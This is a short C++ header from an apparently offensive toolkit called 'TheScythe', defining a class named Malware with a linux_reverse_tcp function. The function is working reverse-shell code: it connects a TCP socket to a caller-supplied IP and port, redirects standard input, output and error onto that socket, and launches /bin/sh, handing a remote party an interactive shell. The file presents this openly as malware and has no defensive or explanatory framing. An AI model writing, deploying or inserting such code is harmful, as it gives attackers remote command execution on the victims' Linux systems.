//
// Created by grimreaper on 3/19/23.
//

#ifndef THE_SCYTHE_LINUX_REVERSE_TCP_HPP
#define THE_SCYTHE_LINUX_REVERSE_TCP_HPP

#include "../core/networking/tcp_client.hpp"
#include "../core/execution/execution.hpp"

namespace TheScythe {
    namespace Core {
        class Malware {
        protected:

        public:
            /// Linux Reverse Tcp
            static void linux_reverse_tcp(const char *ip, int port);
        };
        void Malware::linux_reverse_tcp(const char *ip, int port) {
            struct sockaddr_in sa;
            int s;

            sa.sin_family = AF_INET;
            sa.sin_addr.s_addr = inet_addr(ip);
            sa.sin_port = htons(port);

            s = socket(AF_INET, SOCK_STREAM, 0);
            connect(s, (struct sockaddr *)&sa, sizeof(sa));
            dup2(s, 0);
            dup2(s, 1);
            dup2(s, 2);
            execve("/bin/sh", 0, 0);
        }
    };
}


#endif //THE_SCYTHE_LINUX_REVERSE_TCP_HPP
